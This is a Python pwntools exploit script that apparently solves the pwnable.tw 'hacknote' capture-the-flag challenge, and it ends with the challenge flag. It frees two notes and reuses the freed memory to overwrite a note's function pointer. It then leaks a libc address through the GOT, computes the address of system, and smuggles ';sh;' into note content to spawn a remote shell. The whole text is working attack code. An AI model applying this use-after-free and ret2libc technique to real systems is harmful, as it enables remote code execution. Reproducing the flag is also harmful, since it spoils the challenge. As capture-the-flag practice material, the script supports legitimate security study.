from pwn import *

elf = ELF("hacknote")
libc = ELF('libc_32.so.6')

p = remote("chall.pwnable.tw", 10102)


def menu(option):
    p.sendafter(b"Your choice :", str(option).encode())


def add_note(content, size=None):
    menu(1)
    p.sendafter(b'Note size :', str(len(content) if size is None else size).encode())
    p.sendafter(b'Content :', content)
    return p.readline()


def delete_note(index):
    menu(2)
    p.sendafter(b'Index :', str(index).encode())
    return p.readline()


def print_note(index):
    menu(3)
    p.sendafter(b'Index :', str(index).encode())
    return p.readline()


with log.progress('Massaging the heap') as l:
    l.status('Adding notes at 0 and 1')
    add_note(b'A' * 16)
    add_note(b'B' * 16)

    l.status('Free-ing notes at 0 and 1')
    delete_note(0)
    delete_note(1)

    l.status('Overwriting content of note at 0')
    add_note(p32(0x0804862b) + p32(elf.got['read']))

    l.success()

with log.progress('Leaking libc address') as l:
    leak = print_note(0)
    libc_base = u32(leak[:4]) - libc.symbols['read']

    l.success(hex(libc_base))

system = libc_base + libc.symbols['system']

with log.progress('Massaging again') as l:
    l.status('Deleting note at 2')
    delete_note(2)

    l.status('Overwriting content of note at 0')
    add_note(p32(system) + b';sh;')

    l.success()

with log.progress('Spawing shell') as l:
    menu(3)
    p.sendlineafter(b':', b'0')
    p.sendline(b'/bin/sh')

p.interactive()

# FLAG --> FLAG{Us3_aft3r_fl3333_in_h4ck_not3}
